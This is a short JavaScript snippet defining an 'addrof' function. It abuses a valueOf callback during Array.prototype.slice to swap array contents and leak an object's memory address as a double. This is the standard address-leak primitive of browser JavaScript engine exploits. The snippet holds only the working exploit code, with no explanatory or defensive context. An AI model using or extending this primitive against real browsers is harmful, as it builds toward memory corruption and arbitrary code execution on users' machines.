function addrof(object) {
	var a = [];
	for (var i = 0; i < 100; i++)
		a.push(i + 0.1337);

	var b = a.slice(0, {valueOf: function() { a.length = 0; a = [object]; return 4; }});
	return Int64.fromDouble(b[3]);
}